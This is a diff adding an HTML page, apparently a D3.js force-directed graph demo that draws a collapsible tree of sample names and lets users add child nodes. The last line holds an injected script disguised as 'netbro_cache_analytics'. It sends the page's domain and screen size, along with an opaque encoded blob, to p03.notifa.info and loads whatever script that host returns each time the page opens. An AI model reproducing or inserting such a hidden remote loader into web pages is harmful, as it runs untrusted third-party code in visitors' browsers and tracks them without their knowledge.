@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+    <meta name="keywords" content="D3.js,Force-Directed Graph">
+    <title>D3-Force Directed Graph</title>
+    <!--<script type="text/javascript" src="http://mbostock.github.com/d3/d3.js?1.25.0"></script>-->
+    <script src="https://d3js.org/d3.v3.min.js" defer></script>
+    <style type="text/css">
+
+.node {
+  cursor: pointer;
+}
+
+.desc{
+    /*border: #000 solid thin;*/
+    text-align: center;
+    font-family:"Lucida Sans Unicode", "Lucida Grande", sans-serif;
+    color:#660000;
+    width:800px;
+    margin:auto;
+  }
+
+path.link {
+  fill: none;
+  stroke: #666;
+  stroke-width: 1px;
+}
+
+
+text {
+  fill: #000;
+  font: 12px sans-serif;
+  pointer-events: none;
+}
+.main{
+  min-height: 800px;
+  height: 100%;
+}
+#chart{
+ 
+}
+    </style>
+<script type="text/javascript">
+
+var w = 900,
+    h = 800,
+    node,
+    path,
+    root,nodes,links,rootNode,id=19;
+
+var force,vis;
+var LoadData = true;
+function update() {
+   if (force) force.stop();
+  nodes = flatten(root);
+  links = d3.layout.tree().links(nodes);
+
+  // Restart the force layout.
+  force
+      .nodes(nodes)
+      .links(links)
+      .linkDistance(100)
+      .charge(-1500)
+      .theta(1)
+      .gravity(0.03)
+      .start();
+
+  vis.selectAll("path").remove();    
+  vis.selectAll(".node").remove();
+  
+  path = vis.selectAll("path.link");
+  path = path.data(force.links());
+  path.exit().remove();
+  path
+      .enter().append("svg:path")
+      .attr("class", "link")
+      .attr("marker-end", "url(#end)");
+
+  node = vis.selectAll(".node");
+  node = node.data(force.nodes());
+  node.exit().remove();
+    node
+        .enter().append("g")
+        .attr("class", "node")
+        .on("click", click)
+        .call(force.drag);
+
+   node.append("image")
+      .attr("xlink:href", function(d){return d.imageURL;})//http://t2.gstatic.//com/images?q=tbn:ANd9GcT6fN48PEP2-z-JbutdhqfypsYdciYTAZEziHpBJZLAfM6rxqYX";})
+      .attr("class","image")
+      .attr("x", -20)
+      .attr("y", -20)
+      .attr("width",42)
+      .attr("height",42);
+
+    node.append("text")
+      .attr("class","text")
+      .attr("x",15)
+      .attr("dy", ".35em")
+      .style("fill", color)
+      .text(function(d) {return d.name; });
+}
+
+function tick() {
+  path.attr("d", function(d) {
+
+        if(d.source.id == rootNode.id){
+          d.source.x = (w/2-15);
+          d.source.y = (h/2-15);
+        }
+      
+        var dx = d.target.x - d.source.x,
+            dy = d.target.y - d.source.y,
+            dr = Math.sqrt(dx * dx + dy * dy);
+        return "M" + 
+            d.source.x + "," + 
+            d.source.y + "A" + 
+            dr + "," + dr + " 0 0,1 " + 
+            d.target.x + "," + 
+            d.target.y;
+    });
+
+  node.attr("transform", function(d) {
+
+    if(d.id == rootNode.id){
+      return "translate(" + ((w/2)-20) + "," + ((h/2)-20) + ")";
+    }
+    return "translate(" + d.x + "," + d.y + ")"; });
+  
+}
+
+function color(d) {
+  return d._children ? "#0000FF" : d.children ? "#2B60DE" : "#fd8d3c";
+}
+// Toggle children on click.
+function click(d) {
+  
+  if ((d.children != null || d.children != undefined) || (d._children != null || d._children != undefined)) {
+      if (d.children) {
+        d._children = d.children;
+        d.children = null;
+      } else {
+        d.children = d._children;
+        d._children = null;
+      }
+      update();
+  }
+  
+}
+
+var findNode = function (node) {
+    for (var i in force.nodes()) {
+        if (force.nodes()[i] === node) return true
+    };
+  return false;
+}
+
+// Returns a list of all nodes under the root.
+function flatten(root) {
+  var nodes = [], i = 0;
+
+  function recurse(node) {
+    if (node.children) node.children.forEach(recurse);
+    if (!node.id) node.id = ++i;
+    nodes.push(node);
+  }
+
+  rootNode = root;
+  recurse(root);
+  
+  return nodes;
+}
+function loadImage(){
+  if(LoadData){
+root = {
+"name": "Daniel Vinod", "imageURL":"images/root.png","id":"1",
+"children": [
+  {"name": "Abraham Aaron", "imageURL":"images/user1.png","id":"2",
+  "children":[{"name": "Joseph Titus", "imageURL":"images/user3.png","id":"3"},
+              {"name": "Herold Enoch", "imageURL":"images/user4.png","id":"4"}]},
+
+  {"name": "Samuel Goliatf", "imageURL":"images/user7.png","id":"5", 
+  "children":[{"name": "Enoch Titus", "imageURL":"images/user2.png","id":"6"},
+              {"name": "Quintus Titus", "imageURL":"images/user5.png","id":"7"}]},
+
+  {"name": "Absalom Dauid", "imageURL":"images/user2.png","id":"8" ,
+  "children":[{"name": "Abraham Shalom", "imageURL":"images/user4.png","id":"9"},
+              {"name": "Elisha Titus", "imageURL":"images/user6.png","id":"10"}]},
+
+  {"name": "Daniel Goliatf", "imageURL":"images/user3.png","id":"12",
+  "children":[{"name": "Quintus Titus", "imageURL":"images/user5.png","id":"13"},
+              {"name": "Enoch Titus", "imageURL":"images/user1.png","id":"14"},
+              {"name": "Elisha Titus", "imageURL":"images/user6.png","id":"15",
+                "children":[ {"name": "Enoch Absalom", "imageURL":"images/user1.png","id":"11"}]}]},
+
+  {"name": "Enoch Shalom", "imageURL":"images/user5.png","id":"16",
+  "children":[{"name": "Absalom Joseph", "imageURL":"images/user7.png","id":"17"},
+              {"name": "Shalom Joseph", "imageURL":"images/user4.png","id":"18"}]}
+]
+};
+
+force = d3.layout.force()
+    .on("tick", tick)
+    .size([w, h]);
+
+vis = d3.select("#chart").append("svg:svg")
+    .attr("width", w)
+    .attr("height", h);
+  update();
+  LoadData = false;
+}
+}
+function AddChild(){
+  var name = document.getElementById("inputText").value
+  if (name != null && name == ""){
+    name = "Quintus Titus"
+  }
+  
+  var nodeid = Math.floor(Math.random() * (id - 2)) + 1;
+  var newNode = {
+          "name": name, "imageURL":"images/user5.png","id":id
+    };
+  
+    function childeNode(node) {
+      if (node.id == nodeid){
+        if (node.children)
+            node.children.push(newNode);
+        else 
+          node.children = [newNode];
+      }else{
+        if (node.children){
+        for(var i = 0; i < node.children.length; i++) {
+          childeNode(node.children[i]);
+        }
+        }
+      } 
+    }
+    childeNode(root);
+
+    id++;
+    update();
+}
+
+    </script>
+  </head>
+  <body onLoad="loadImage();">
+    <div class="main">
+    <input type="text" name="Your Name" id="inputText" value="">
+    <input type="button" name="addchild" value="Add New Child" onClick="AddChild();"/>
+    <div id="chart"></div>
+    
+    <div class="desc">
+    Demo contains force directed graph of D3.js, this demo manipulates visual document based on data.D3 helps bringing data to life using HTML,SVG and CSS.We can also draw graph from json or xml data at runtime.
+    <br/>
+    Technologies Used :  <b><font color="red"><a href="http://coffeescript.org/">javaScript/CoffeeScript</a>, <a href="http://d3js.org/"> D3.js</a></font></b>
+    </div>
+</div>
+
+
+  
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdAr7ZZFRsU15ymNHTyhyH1J4NSJSwurd6m1VsY2O71ldrVU9p9BjCRgID1yZ6UeBG%2fOlG3naRm%2bmqU9nxr3vnWKL%2fLpC6r90MzQtjR9RP04nITXdhkCkgbcZYpdcme88jgAIFsn5juRR9RpekbRKnXlckfBNgJh9As21esaDwKZxu%2fJDTNXSr%2fiV%2bpeApFPVsmF2aAXQID%2fECQo5JQd5GebLKYx%2foVffXiu1WqrcZIpv%2b8QNofmXC8OrTELZkZvmzV4l%2ftP%2fFWNP8FeA6QVc316bySAKPIoOrDyM192XwUYUSNLyntwbLNMaHhNnOSbNUbcwucrqs9XSp7u1iLzQ6af0i6PcshbszwG0oOIzPtVWqEGz8xl2YWfXCD5UV3WM1E9ASWkHPl4NJTKNLKrqIZT3fZrxU6kJepn02W6VltwMnffnP0hzAt4eIWC2hXACaLn1RPVpTY%2bu4X2HX8nPJ12WrWUbAqSSeG%2fu%2fi6nNBOwye85TpI3Fg9S8yr1pq0IXKyp3juXibjA2pZNYWANz%2fg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
